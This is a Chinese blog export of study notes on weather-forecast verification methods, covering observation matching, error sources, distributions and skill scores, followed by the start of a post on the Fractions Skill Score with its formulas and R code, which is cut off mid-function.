<h2 id="预测和观测"><a href="#预测和观测" class="headerlink" title="预测和观测"></a>预测和观测</h2><h3 id="预测、观测的类型"><a href="#预测、观测的类型" class="headerlink" title="预测、观测的类型"></a>预测、观测的类型</h3><p>连续的</p>
<ol>
<li>温度</li>
<li>雨量</li>
<li>500mb高度</li>
</ol>
<p>分类</p>
<ol>
<li>二分类<ol>
<li>雨与无雨<ol>
<li>强风与无强风</li>
<li>夜间霜冻与无霜冻</li>
</ol>
</li>
</ol>
</li>
<li>多分类<ol>
<li>云量类别</li>
<li>降水类型（小雨、中雨、暴雨等）</li>
</ol>
</li>
</ol>
<h3 id="匹配预测和观测结果"><a href="#匹配预测和观测结果" class="headerlink" title="匹配预测和观测结果"></a>匹配预测和观测结果</h3><ol>
<li><p>点对点网格</p>
<ol>
<li><p>匹配obs到最近的网格点</p>
</li>
<li><p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%82%B9%E5%AF%B9%E7%82%B9.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%82%B9%E5%AF%B9%E7%82%B9.png"></p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%82%B9%E5%AF%B9%E7%82%B9%E4%BE%8B%E5%AD%90.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%82%B9%E5%AF%B9%E7%82%B9%E4%BE%8B%E5%AD%90.png"></p>
<p>匹配雨量为最近的网格点的值，最近的点（右上角）值为0，所以fcst = 0</p>
</li>
</ol>
</li>
<li><p>网格点对点</p>
<ol>
<li><p>插值？</p>
</li>
<li><p>取最大的价值吗？</p>
</li>
<li><p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%BD%91%E6%A0%BC%E5%AF%B9%E7%82%B9.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%BD%91%E6%A0%BC%E5%AF%B9%E7%82%B9.png"></p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%BD%91%E6%A0%BC%E5%AF%B9%E7%82%B9%E4%BE%8B%E5%AD%90.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%BD%91%E6%A0%BC%E5%AF%B9%E7%82%B9%E4%BE%8B%E5%AD%90.png"></p>
<p>将网格值插值到雨量的位置（粗略假设：每个网格点的权重相等）</p>
<p><code>20 * 0.25 *3 = 15</code></p>
</li>
</ol>
</li>
</ol>
<blockquote>
<p>不建议使用模型分析作为验证的“观测”</p>
<p>因为：不独立！！</p>
<p>非独立会影响什么？“更好的”的分数……（不具有代表性）</p>
</blockquote>
<h2 id="观测特征及其影响"><a href="#观测特征及其影响" class="headerlink" title="观测特征及其影响"></a>观测特征及其影响</h2><h3 id="观测并不完美！"><a href="#观测并不完美！" class="headerlink" title="观测并不完美！"></a>观测并不完美！</h3><p>观测误差 vs 可预测性和预测误差/不确定性</p>
<p>相同参数的不同观测类型（手动或自动）可能会影响结果</p>
<p>典型的仪表错误有：</p>
<ul>
<li>温度：+/- 0.1℃</li>
<li>风速：速度相关误差，+/- 0.5m/s</li>
<li>降水（仪表）：+/- 0.1mm（half tip），但高达50%</li>
</ul>
<p>其他问题：定位问题（例如，屏蔽/暴露）</p>
<p>在某些情况下，“预测”误差与<strong>仪器的限制</strong>非常相似</p>
<h3 id="观察误差的影响"><a href="#观察误差的影响" class="headerlink" title="观察误差的影响"></a>观察误差的影响</h3><p>观测误差增加了验证结果的不确定性</p>
<p>对验证结果的影响</p>
<ol>
<li>RMSE - 高估</li>
<li>传播 - 更多 obs 异常值使整体看起来分散不足</li>
<li>可靠性 - 较差</li>
<li>分辨率 - BS 分解更大，但 ROC 区域更差</li>
<li>CRPS - 较差的平均值</li>
</ol>
<p>更多的样本可以有所帮助（结果的可靠性）</p>
<h2 id="供验证的统计依据"><a href="#供验证的统计依据" class="headerlink" title="供验证的统计依据"></a>供验证的统计依据</h2><h3 id="验证的统计依据"><a href="#验证的统计依据" class="headerlink" title="验证的统计依据"></a>验证的统计依据</h3><p>任何验证活动都应从彻底检查预测和观测结果的<strong>统计特性</strong>开始。</p>
<ol>
<li>例如，许多工具都是基于<strong>正态性（高斯分布）的假设</strong>。这是否适用于有问题的数据集？</li>
<li>预测是否捕捉到了观测到的<strong>范围</strong>？</li>
<li>预测和观察到的<strong>分布</strong>是否匹配/一致？</li>
<li>他们有相同的<strong>平均值，变化特征</strong>等吗？</li>
</ol>
<hr>
<p>除了需要评估数据的特征之外</p>
<p><strong>联合分布</strong>、<strong>边际分布</strong>和<strong>条件分布</strong>有助于理解预测验证的<strong>统计基础</strong></p>
<ol>
<li>这些分布可以与验证中使用的<strong>具体总结</strong>和<strong>性能度量</strong>有关</li>
<li>对验证感兴趣的<strong>特定属性</strong>是由这些分布来衡量的</li>
</ol>
<h4 id="基本概率"><a href="#基本概率" class="headerlink" title="基本概率"></a>基本概率</h4><p>又称（边际概率）</p>
<p>$p_x = p(X=x)$</p>
<p>一个随机变量X将取值x的概率</p>
<h4 id="联合概率"><a href="#联合概率" class="headerlink" title="联合概率"></a>联合概率</h4><p>$p_{x,y} = p(X=x,Y=y)$</p>
<p>事件x和y<strong>同时发生</strong>的概率</p>
<h4 id="条件概率"><a href="#条件概率" class="headerlink" title="条件概率"></a>条件概率</h4><p>$p_{x,y} = p(X=x|Y=y)$</p>
<p>给定事件y为真（或发生）时，事件x为真（或发生）的概率</p>
<hr>
<p>验证可以表示为评价预测和观测的<strong>联合分布</strong>的过程</p>
<p>（验证就是预测和观测场一样，也就是两者同时发生的情况，也就是联合分布）</p>
<ol>
<li>所有关于预测、观测及其关系的信息都用这种分布来表示</li>
<li>联合分布可以被分解成两对条件分布和边际分布<ul>
<li>$p(f,x) = p(F=f|X=x)p(X=x)$</li>
<li>$p(f,x) = p(X=x|F=f)p(F=f)$</li>
</ul>
</li>
</ol>
<h3 id="分布的图形化表示"><a href="#分布的图形化表示" class="headerlink" title="分布的图形化表示"></a>分布的图形化表示</h3><p>联合分布</p>
<ol>
<li>散点图</li>
<li>密度图</li>
<li>三维直方图</li>
<li>等高线图</li>
</ol>
<p>边际分布</p>
<ol>
<li><p>茎叶图 <a href="http://blog.sina.com.cn/s/blog_4da7fafa0100y9i3.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4da7fafa0100y9i3.html</a></p>
</li>
<li><p>直方图/柱状图</p>
</li>
<li><p>方框图</p>
</li>
<li><p>累积分布图</p>
</li>
<li><p>分位数-分位数图/Q-Q图</p>
</li>
<li><p>密度函数图（函数做y，取值做x）</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0%E5%9B%BE.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0%E5%9B%BE.png"></p>
</li>
<li><p>累积分布图（累计值做y，取值做x）</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%B4%AF%E7%A7%AF%E5%88%86%E5%B8%83%E5%9B%BE.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E7%B4%AF%E7%A7%AF%E5%88%86%E5%B8%83%E5%9B%BE.png"></p>
</li>
</ol>
<p>条件分布</p>
<ol>
<li><p>条件分位数图</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E6%9D%A1%E4%BB%B6%E5%88%86%E4%BD%8D%E6%95%B0%E5%9B%BE.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E6%9D%A1%E4%BB%B6%E5%88%86%E4%BD%8D%E6%95%B0%E5%9B%BE.png"></p>
</li>
<li><p>条件箱形图</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E6%9D%A1%E4%BB%B6%E7%AE%B1%E5%BD%A2%E5%9B%BE.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E6%9D%A1%E4%BB%B6%E7%AE%B1%E5%BD%A2%E5%9B%BE.png"></p>
</li>
<li><p>茎叶图</p>
<p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E8%8C%8E%E5%8F%B6%E5%9B%BE.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/%E8%8C%8E%E5%8F%B6%E5%9B%BE.png"></p>
</li>
</ol>
<h2 id="比较和推理"><a href="#比较和推理" class="headerlink" title="比较和推理"></a>比较和推理</h2><p>技能分数（Skill scores）</p>
<ol>
<li>技能分数是对相对表现的一种衡量标准</li>
<li>测量超过标准的改进百分比</li>
<li>正向导向（越大越好）</li>
<li>标准的选择很重要</li>
</ol>
<p>通用技能分数定义：</p>
<p>$\frac {M - M_{ref}}{M_{perf} - M_{ref}}$</p>
<p>M是对预测的验证度量</p>
<p>$M_{ref}$是衡量参考预测的指标</p>
<p>$M_{perf}$是对完美预测的衡量标准</p>
<h3 id="参考类型"><a href="#参考类型" class="headerlink" title="参考类型"></a>参考类型</h3><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>例子</th>
<th>特性</th>
</tr>
</thead>
<tbody>
<tr>
<td>Random<br>随机</td>
<td>Equitable Threat Score<br>（公平的威胁得分）</td>
<td>很好理解的统计基准<br>没有物理意义</td>
</tr>
<tr>
<td>Persistence<br>持续</td>
<td>Constructed skill score<br>构建的技能分数</td>
<td>可预测性的度量（当持久性是一个糟糕的预测时，可预测性很低）<br>显示运行 NWP 模型的附加值</td>
</tr>
<tr>
<td>Sample climate<br>样品气候</td>
<td>Constructed skill score<br>构建的技能分数</td>
<td>比持久性更进一步，即平滑<br>由于政权依赖性，保留了可预测性元素</td>
</tr>
<tr>
<td>Long-term climatology <br>长期气候学</td>
<td>Constructed skill score,extremes<br>构建的技能得分，极端值</td>
<td>最简单的节拍参考，最流畅<br>对代表性、汇集问题、气候变化趋势的关注</td>
</tr>
</tbody>
</table>
</div>
<p>应该尽可能地估计分数和测量方法的不确定性！</p>
<p>不确定性来自于</p>
<ul>
<li>抽样变化性</li>
<li>观察误差</li>
<li>代表性差异</li>
<li>其他？</li>
</ul>
<p>置信区间和假设检验的方法</p>
<ul>
<li><p>参数化（即，取决于一个统计模型）</p>
</li>
<li><p>非参数（例如，源自重采样过程，通常称为“引导”）</p>
</li>
</ul>
<h2 id="验证属性"><a href="#验证属性" class="headerlink" title="验证属性"></a>验证属性</h2><p>验证属性度量预测质量的不同方面</p>
<ul>
<li>表示应该考虑的一系列特性</li>
<li>许多可能与预测和观测的联合、条件和边际分布有关</li>
</ul>
<p>例子</p>
<ol>
<li>偏见<br>(边际分布)</li>
<li>相关性<br>整体关联（联合分布）</li>
<li>准确度<br>差异（联合分布）</li>
<li>校准<br>测量条件偏差（条件分布）</li>
<li>区别<br>预测区分不同观测值的程度（条件分布）</li>
</ol>
<h3 id="验证措施的理想特点"><a href="#验证措施的理想特点" class="headerlink" title="验证措施的理想特点"></a>验证措施的理想特点</h3><p>统计有效性</p>
<p>特性（概率预测）</p>
<ol>
<li>当预测与预测者的最佳判断相一致时，就会达到“最佳”得分</li>
<li>“对冲”是惩罚</li>
<li>示例：Brier分数</li>
</ol>
<p>公平性</p>
<ol>
<li>恒定和随机预测应获得相同的分数<br>示例：Gilbert 技能得分（2x2 案例）； Gerrity 评分</li>
<li>没有分数达到更严格意义上的这一点<br>例如：大多数分数对偏差、事件频率很敏感</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>所有的预测都应该经过验证——如果有什么东西值得预测，那就值得验证</p>
</li>
<li><p>分层和聚合</p>
<ol>
<li>聚合可以帮助增加样本大小和统计健壮性，但也可以隐藏性能的重要方面<ol>
<li>最常见的制度可能主导结果，掩盖了性能的变化</li>
<li>因此，将结果分层为有意义的同质子组是非常重要的</li>
</ol>
</li>
</ol>
</li>
<li><p>观测场</p>
<ol>
<li><p>没有所谓的“真相”！！</p>
</li>
<li><p>观察结果通常比模型分析更“真实”（至少它们相对更独立）</p>
</li>
<li><p>无论以任何可能的方式，都应该考虑到观测结果的不确定性</p>
<p>例如，相邻的观测结果彼此匹配得如何？</p>
</li>
</ol>
</li>
<li><p>4w+h</p>
<ol>
<li>who：谁想知道</li>
<li>what<ol>
<li>用户关心吗</li>
<li>我们在评估什么参数吗？它的特征是什么（例如，连续的、概率性的）？</li>
<li>阈值很重要（如果有的话）？</li>
<li>预测分辨率是否相关（例如，特定地点、区域平均）？</li>
<li>obs的特征（例如质量、不确定性）？</li>
<li>是否有适当的方法？</li>
</ol>
</li>
<li>why：我们需要验证吗？</li>
<li>how：您是否需要/显示相关结果（例如，分层/聚合）？</li>
<li>which<ol>
<li>方法和度量标准是否合适吗？</li>
<li>需要采用方法（例如，偏差、事件频率、样本量）</li>
</ol>
</li>
</ol>
</li>
<li><p>茎状图和叶图：边缘分布和条件分布</p>
</li>
</ol>
<h1 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h1><h2 id="观测数据来源"><a href="#观测数据来源" class="headerlink" title="观测数据来源"></a>观测数据来源</h2><ol>
<li><p>如果我们对预报有效期内的<strong>每个地点和每个时间点</strong>进行<strong>观测</strong>，这不是很好吗？</p>
<p>这样我们就可以对任何预测进行完全的验证</p>
</li>
<li><p><strong>观测结果</strong>代表了大气在空间和时间上的<strong>真实</strong>状态的<strong>一个“样本”</strong>。</p>
</li>
<li><p>观测也可能在<strong>某个点</strong>或<strong>一个区域</strong>上有效</p>
<p>实地观测或遥感的</p>
</li>
<li><p><strong>实地观测</strong> - <strong>地面</strong>或<strong>高空大气</strong></p>
<ol>
<li>在现场，<strong>点有效</strong></li>
<li><strong>高分辨率</strong>，但在空间中<strong>采样严重不足</strong></li>
<li>较<strong>新</strong>的仪器几乎可以<strong>连续地取样</strong></li>
<li>唯一重要的误差是<strong>仪器误差</strong>，通常很<strong>小</strong></li>
</ol>
</li>
</ol>
<h3 id="遥感观察"><a href="#遥感观察" class="headerlink" title="遥感观察"></a>遥感观察</h3><p><strong>卫星</strong>和<strong>雷达</strong>是最常见的</p>
<ol>
<li>雷达<ol>
<li>测量地表上方体积内<strong>水凝物的反向散射</strong> </li>
<li>与感测体积中的降雨率的关系是一个复杂的函数，但已知 </li>
<li>感知到的平均雨率与雨率（或地表的总降雨量）之间的联系要脆弱得多</li>
<li>误差的几种来源：<strong>衰减</strong>、<strong>异常传播</strong>、<strong>接近冰点的明亮频带</strong>等。</li>
</ol>
</li>
<li>卫星<ol>
<li>根据仪器测量<strong>一个或多个频带内</strong>的后向散射辐射。</li>
<li>通常低垂直分辨率 - 可以测量总柱水分 </li>
<li><strong>传递函数</strong>需要将<strong>返回值</strong>转换为感兴趣的<strong>变量的估计数</strong>。</li>
<li>对<strong>云</strong>最有用，特别是与表面观测相结合</li>
</ol>
</li>
</ol>
<h3 id="遥感数据"><a href="#遥感数据" class="headerlink" title="遥感数据"></a>遥感数据</h3><ol>
<li><strong>大数据</strong>量 </li>
<li>检测到的变量通常<strong>不是要验证</strong>的变量 – 需要<strong>传递函数</strong> – <strong>误差源</strong>之一 </li>
<li><strong>分辨率</strong>取决于<strong>仪器</strong>，雷达为几米，卫星数据为1公里左右。</li>
<li>高覆盖率，在时间上可能是零星的</li>
<li>注意由于<strong>外部影响信号</strong>而造成的错误</li>
</ol>
<h3 id="数据特征总结"><a href="#数据特征总结" class="headerlink" title="数据特征总结"></a>数据特征总结</h3><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>实地考察</th>
<th>雷达</th>
<th>卫星</th>
</tr>
</thead>
<tbody>
<tr>
<td>分辨率 - 空间</td>
<td>高 - 点</td>
<td>相当高 - 雷达量平均数</td>
<td>取决于足迹在1公里左右</td>
</tr>
<tr>
<td>分辨率 - 时间</td>
<td>高</td>
<td>高</td>
<td>高</td>
</tr>
<tr>
<td>空间采样频率</td>
<td>这是很低的，除了特殊的网络</td>
<td>高 - 基本上是连续的</td>
<td>其域内的地理位置高 极地轨道变量</td>
</tr>
<tr>
<td>时间采样频率</td>
<td>可以是高</td>
<td>高，通常为10min左右</td>
<td>中等用于地球轨道。<br>低，适用于极地轨道飞行</td>
</tr>
</tbody>
</table>
</div>
<p><strong>分辨率</strong>：定义观测值的<strong>时间或空间距离</strong></p>
<p><strong>采样频率</strong>（粒度）：在时间或空间上的<strong>观测频率</strong></p>
<h3 id="误差和不确定性的来源"><a href="#误差和不确定性的来源" class="headerlink" title="误差和不确定性的来源"></a>误差和不确定性的来源</h3><ol>
<li><p>在频率或值上的偏差</p>
</li>
<li><p>仪器偏差</p>
</li>
<li><p>随机误差或噪声</p>
</li>
<li><p>报告错误</p>
</li>
<li><p>主观观察 </p>
<p>例如云覆盖</p>
</li>
<li><p>精度误差</p>
</li>
<li><p>传输函数错误</p>
</li>
<li><p>分析误差</p>
<p>当使用分析时</p>
</li>
</ol>
<h3 id="观测的质量控制"><a href="#观测的质量控制" class="headerlink" title="观测的质量控制"></a>观测的质量控制</h3><p>做这件事是绝对必要的，即使是“好的” 观测站点</p>
<p>基本方法</p>
<pre><code> 1. **伙伴检查**（空间和时间）
 2. 简单的**范围检查**
 3. **趋势检查**（与附近的独立时空检查）
 4. 绝对值检查。
 5. 在不消除太多“好”数据的情况下删除“坏”数据
 6. 但不做预测 - 观测的差异检查
</code></pre><p>使用模型作为观察的比较标准不是一个好主意，作为一个过滤器来消除模型无法解决的极端情况</p>
<p>​    1. 使观测数据依赖于模型</p>
<pre><code> 2. 在qc中使用的模型得到了更好的验证结果
</code></pre><p>了解有关仪器及其错误的细节也很重要。</p>
<h2 id="预测有效性类型"><a href="#预测有效性类型" class="headerlink" title="预测有效性类型"></a>预测有效性类型</h2><p>用于客观验证</p>
<p>“预测<strong>必须被陈述</strong>，以便它们可核实”</p>
<p>一个<strong>预测的意义</strong>是什么？精确度吗？</p>
<ol>
<li>需要进行<strong>客观验证</strong></li>
<li>如果验证是<strong>面向用户</strong>的，那么<strong>用户的理解</strong>是很重要的</li>
<li>所有预测对<strong>空间点或区域</strong>都<strong>有效</strong></li>
<li>在这个地区的所有点上吗？</li>
</ol>
<p>同样对于时间：一个预测可能是</p>
<ol>
<li>时间的一瞬间 </li>
<li>一个瞬间在时间上，但“某个时间”在一个范围内</li>
<li>一段时间，例如24小时折旧</li>
<li>在一段时间内的极端情况吗？</li>
</ol>
<h3 id="预测数据来源，以供验证"><a href="#预测数据来源，以供验证" class="headerlink" title="预测数据来源，以供验证"></a>预测数据来源，以供验证</h3><p>所有类型的NWP模型</p>
<ol>
<li>主要变量(P或Z、T、U、V、RH或Td)的确定性预测，通常是在模型的三维域上的网格点</li>
<li>其他衍生变量：由模型计算出的折旧率、折旧总额、云量和高度等，可能无法观测到</li>
<li>空间和时间表示被认为是连续的，但有限的尺度集可以被解决。</li>
</ol>
<p>后处理模型输出</p>
<ol>
<li>统计方法，如MOS</li>
<li>动态的或经验性的方法，例如折旧类型</li>
<li>相互依赖的模型，如海浪</li>
</ol>
<p>操作预测 </p>
<ol>
<li>格式取决于用户的需要</li>
<li>可以是点，可以是一个区域或一段时间内的最大平均值或次要平均值</li>
</ol>
<p>“一切都应该得到核实”</p>
<h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><ol>
<li><p><strong>连续的</strong></p>
<ol>
<li>可以在其范围内承担任何值（接近）</li>
<li>例如温度、风</li>
<li>预测是针对特定的值进行的</li>
</ol>
</li>
<li><p><strong>分类的</strong></p>
<ol>
<li>只能接受一小部分特定的值</li>
<li>可以这样观察到，如降水、降水类型、视觉障碍</li>
<li>可以从一个连续的变量中“分类”，例如降水量、上限、vis、云量</li>
<li>如果有，验证为<strong>分类</strong>或<strong>发生概率</strong></li>
</ol>
</li>
<li><p>概率分布</p>
<ol>
<li>验证为<strong>概率分布函数</strong>或<strong>累积分布函数</strong></li>
</ol>
</li>
<li><p>转换变量</p>
<ol>
<li><p>数值已从原始观测值中有所改变</p>
</li>
<li><p>示例：</p>
<ol>
<li><p>准连续变量的分类，例如云量</p>
</li>
<li><p>要根据用户需求进行评估：</p>
<ol>
<li>“升级”到模型网格盒</li>
<li>插补</li>
</ol>
</li>
<li><p>转换观测值的分布：</p>
<p>例如，通过子设置来选择极端情况</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="数据匹配问题"><a href="#数据匹配问题" class="headerlink" title="数据匹配问题"></a>数据匹配问题</h2><p>例如，预测可以在空间上定义为“威胁区域”，或在网格（模型）上表示</p>
<ol>
<li>有限尺度集</li>
<li>在空间和时间上相关</li>
</ol>
<p>观测结果是分散的点值</p>
<ol>
<li>代表所有刻度，但仅在车站有效</li>
<li>采样不足作为场</li>
</ol>
<p>预测至观测技术：</p>
<ol>
<li>问：在验证地点的预测是什么？</li>
<li>推荐的验证方法-不要考虑观测值。</li>
<li>插值到观测位置的插值-为平滑变量</li>
<li>最近的网格点-用于“情景性”或空间分类变量</li>
<li>除QC外，观察结果保持不变</li>
<li>有时，通过将模型预测转换为“如果预测正确，卫星将看到什么”，可以对遥感数据进行验证</li>
</ol>
<p>观测预测技术（适用针对建模人员）：</p>
<ol>
<li>放大——在网格上求平均值——仅当这是预测（模型）的真正定义时，例如Cherubini等人2002<ol>
<li>本地验证</li>
</ol>
</li>
<li>只验证那些有数据的地方！</li>
</ol>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="降水验证项目：方法论-欧洲"><a href="#降水验证项目：方法论-欧洲" class="headerlink" title="降水验证项目：方法论 - 欧洲"></a>降水验证项目：方法论 - 欧洲</h3><p>升尺度：</p>
<p>1x1个网格框，模型分辨率的限制</p>
<p>网格箱上的平均磅，每个网格箱至少9吨（欧洲数据）</p>
<p>网格盒上的平均 obs，每个网格盒至少 9 个 stns（欧洲数据） </p>
<p>仅在有足够的数据处进行验证</p>
<p>回答在模型的能力范围内关于预测的质量的问题</p>
<p>最有可能的用户是建模者</p>
<p>模型技术观察：</p>
<ol>
<li>在模型网格上的观测数据分析<ol>
<li>经常做，但除了一些模型研究外，不是一个验证的好主意</li>
<li>使用模型独立的方法进行分析，如巴恩斯</li>
<li>使用依赖模型的方法进行分析-数据同化（验证错误！）例如，Park等人，2008年</li>
</ol>
</li>
</ol>
<p>不同的“真理”的影响</p>
<h2 id="将匹配点obs与区域延迟的预测相匹配：事件是什么？"><a href="#将匹配点obs与区域延迟的预测相匹配：事件是什么？" class="headerlink" title="将匹配点obs与区域延迟的预测相匹配：事件是什么？"></a>将匹配点obs与区域延迟的预测相匹配：事件是什么？</h2><p>对于分类预测，我们必须清楚正在预测的“事件”</p>
<ol>
<li>预测有效的位置或区域</li>
<li>对它有效的时间范围</li>
<li>类别定义</li>
</ol>
<p>现在，什么被定义为正确的预测呢？</p>
<ol>
<li>该事件被预测出来，并在该地区的任何地方被观察到吗？超过一定比例的面积？</li>
<li>规模考虑因素</li>
</ol>
<h2 id="收集数据进行验证"><a href="#收集数据进行验证" class="headerlink" title="收集数据进行验证"></a>收集数据进行验证</h2><p>存档预测和观测</p>
<ol>
<li>你自己的：观测站观测和相应的预报</li>
<li>大多数NWP中心将他们的预测和观察结果存档；如果你使用他们的模型，你可能会让他们给你相关的数据进行验证</li>
</ol>
<p>目标：生成一套相匹配的预测和观测结果</p>
<hr>
<p>emm, ppt看的有点迷呀，，，唉</p>
<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p>链接：<a href="https://www.7thverificationworkshop.de/Tutorial/Tutorial-Talks/index.html" target="_blank" rel="noopener">https://www.7thverificationworkshop.de/Tutorial/Tutorial-Talks/index.html</a></p>
<ol>
<li><a href="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/tutorial_verification_basics.pdf" target="_blank" rel="noopener">验证基础</a></li>
<li><a href="http://r7wiw08xi.hn-bkt.clouddn.com/7th%20International%20Verification%20Methods%20Workshop/tutorial_data_preparation.pdf" target="_blank" rel="noopener">数据准备</a></li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Verification</tag>
        <tag>ppt</tag>
      </tags>
  </entry>
  <entry>
    <title>FSS_FractionScoreSkill</title>
    <url>/2022/03/04/16-29/</url>
    <content><![CDATA[<h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p><img src="http://r7wiw08xi.hn-bkt.clouddn.com/fss/%E5%BC%95%E5%85%A5%E9%97%AE%E9%A2%98.png" alt="http://r7wiw08xi.hn-bkt.clouddn.com/fss/%E5%BC%95%E5%85%A5%E9%97%AE%E9%A2%98.png"></p>
<p>对于如上预测场和观测场，虽然降水都分布在7个降水格点上，但位置均未能一一对应，所以其TS评分等评分为0（没有降水预报技巧），但从<strong>概率</strong>角度看，观测与预报的降水发生概率是一样的，7/49，具有<strong>相同的降水预报面积</strong>。</p>
<h3 id="FSS"><a href="#FSS" class="headerlink" title="FSS"></a>FSS</h3><p>作者：Robert、Lean（2008）</p>
<p>作用：考察不同尺度内降水发生概率</p>
<h2 id="具体公式"><a href="#具体公式" class="headerlink" title="具体公式"></a>具体公式</h2><h3 id="按步骤"><a href="#按步骤" class="headerlink" title="按步骤"></a>按步骤</h3><ol>
<li><p>Brier评分的变形：比较预报与观测的降水频率 FBS (Fraction Brier Score)</p>
<p>公式：$FBS = \frac{1}{N} \displaystyle \sum_{N}(P_{fcst} - P_{obs})^2$</p>
<p>$P_{fcst}$、$P_{obs}$：每个领域尺度内 预报与预测降水发生概率（0 - 1）</p>
<p>N：网格数量</p>
</li>
<li><p>方差技巧评分：获取正定的（特征值均为正）评分</p>
<p>公式：$FSS = 1 - \frac{FBS} {\frac{1}{N}(\displaystyle \sum_N P_{fcst}^2 + \displaystyle \sum_N P_{obs}^2)}$</p>
<p>FSS</p>
<ol>
<li><p>范围（0 - 1）</p>
<p>0 ：完全不匹配</p>
<p>1：完美匹配</p>
</li>
<li><p>特点：<br>领域尺度增加 -&gt; FSS评分增大</p>
<p>当$P_{fcst} = bP_{obs}$，FSS评分向 $2b/(b^2+1)$ 渐近</p>
</li>
</ol>
</li>
</ol>
<h3 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h3><p>$FSS = 1 - \frac{\frac{1}{N} \displaystyle \sum_{N}(P_{fcst} - P_{obs})^2} {\frac{1}{N}(\displaystyle \sum_N P_{fcst}^2 + \displaystyle \sum_N P_{obs}^2)}$</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="R语言"><a href="#R语言" class="headerlink" title="R语言"></a>R语言</h3><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>链接：<a href="https://rdrr.io/cran/verification/src/R/fss.R#heading-0" target="_blank" rel="noopener">https://rdrr.io/cran/verification/src/R/fss.R#heading-0</a></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fss &lt;- <span class="keyword">function</span>(obs, pred, w = <span class="number">0</span>, FUN = mean, <span class="keyword">...</span>)&#123;</span><br><span class="line"><span class="comment">### compare matrixes of forecast of observed values and forecast.</span></span><br><span class="line"><span class="comment">### values can be calcuated using different windows.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### with a window size of 0, obs is returned.</span></span><br><span class="line">obs.matrix &lt;- matrix.func(DAT = obs, w = w, FUN = FUN) </span><br><span class="line">  </span><br><span class="line"><span class="comment">### with a window size of 0, obs is returned.</span></span><br><span class="line">frcs.matrix &lt;- matrix.func(DAT = pred, w = w, FUN = FUN)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(nrow(obs)!= nrow(pred) &amp;  ncol(obs)!=  nrow(obs) ) <span class="keyword">stop</span>(<span class="string">"Observation matrix and forecast matrix different sizes"</span>)</span><br><span class="line">  </span><br><span class="line">n   &lt;- prod(dim(obs.matrix))  <span class="comment">### number of gridpoints</span></span><br><span class="line"></span><br><span class="line">N   &lt;- sum((obs.matrix-frcs.matrix)^<span class="number">2</span>, na.rm = <span class="literal">TRUE</span>)/n <span class="comment">### numerator</span></span><br><span class="line">D   &lt;- (sum(obs.matrix^<span class="number">2</span>, na.rm = <span class="literal">TRUE</span>) +sum(frcs.matrix^<span class="number">2</span>, na.rm = <span class="literal">TRUE</span>))/n <span class="comment">### denominator</span></span><br><span class="line"></span><br><span class="line">FSS &lt;- <span class="number">1</span> - N/D  </span><br><span class="line"><span class="keyword">return</span>(FSS)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">matrix.func &lt;- <span class="keyword">function</span>(DAT, w = <span class="number">0</span>, FUN = mean, <span class="keyword">...</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">### w is the '' radius'' of window.  eg. w = 2, defines a 5 by 5 square</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">### define function</span></span><br><span class="line">FUN &lt;- match.fun(FUN)</span><br><span class="line"></span><br><span class="line"><span class="comment">### define output dimension</span></span><br><span 